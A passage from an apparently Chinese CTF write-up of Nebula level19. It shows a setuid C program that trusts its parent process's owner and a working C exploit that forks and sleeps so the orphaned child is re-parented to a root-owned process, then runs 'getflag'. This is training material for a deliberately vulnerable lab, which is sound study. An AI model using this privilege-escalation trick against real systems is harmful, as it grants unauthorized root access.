level18@nebula:/home/flag18$ 
</pre>
<div><span style="color:rgb(0,112,192);font-family:inherit;font-weight:bold;background-color:transparent;">level19</span></div>
<p>使用用户名和密码为level19登录ssh</p>
<p><b>详情</b></p>
<pre>There is a flaw in the below program in how it operates.</pre>
<p>程序代码</p>
<pre class="selected">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &amp;statbuf) == -1) {
      printf("Unable to check parent process\n");
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve("/bin/sh", argv, envp);
      err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}<br /></pre>
<p>运行程序</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553955755_5c9f7babb20e6.png" src="images/20190330/1553955755_5c9f7babb20e6.png" width="448" height="127" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553955755_5c9f7babb20e6.png" width="448" height="127" /></p></noscript>
<p>exp</p>
<pre class="selected">#include&lt;stdio.h&gt;
#include&lt;unistd.h&gt;

int main(void) {

    pid_t pid = fork();

    if (pid == 0) {

        char *arg[] = { "/bin/sh" , "-c" , "getflag" , NULL};
        sleep(2); /* Give the fork 2 sec to orphan */
        execv("/home/flag19/flag19", arg);
        printf("Done fork\n");
        return 0;
    }

    printf("Done parent\n");
    return 0;
}<br /></pre>
<p></p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553955891_5c9f7c3305d0d.png" src="images/20190330/1553955891_5c9f7c3305d0d.png" width="690" height="120" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553955891_5c9f7c3305d0d.png" width="690" height="120" /></p></noscript>
                                
                                <div class="column-support">
                                    <p class="support-mount good_num"></p>
                                    <a href="javascript:void (0);" data-status="0" data-id="199594" class="good"></a>
                                </div>
                                <script>
                                    $('.good').on('click',function () {
                                        var login = $(this).attr('data-status');
                                        if(login){
                                            var token = $('#token').val();
                                            var id = $(this).attr('data-id');
                                            var good = $('.good_num').text();
                                            var _this = $(this);
                                            var _url = document.location.href;
                                            $.ajax({
                                                type: "post",
                                                url: _url,
                                                data: {'token':token,'id':id, 'good':1},
                                                success: function (data) {
                                                    $('#token').val(data.token);
                                                    if(data.code ==400){
                                                        layer.open({
                                                            title: '系统提示',
                                                            btnAlign: 'c',
                                                            content: data.msg,
                                                            area: '278px',
                                                        });
                                                    }else {
                                                        if(good){
                                                            good++;
                                                        }else {
                                                            good=1;
                                                        }
                                                        $('.good_num').text(good);
                                                        _this.disabled();
                                                    }
                                                },
                                            })
                                        }else {
                                            layer.open({
                                                title: '系统提示',
                                                btnAlign: 'c',
                                                content: '请先登录',
                                                btn: ['登录'],
                                                area: '278px',
                                                yes: function () {
                                                    login();
                                                },
                                            });
                                        }
                                        return false;
                                    })
                                    function login(){
                                        window.location.href = 'https//www.freebuf.com/oauth';
                                    }
                                </script>
                                                    </div>
                        <div class="wechatcodeDiv">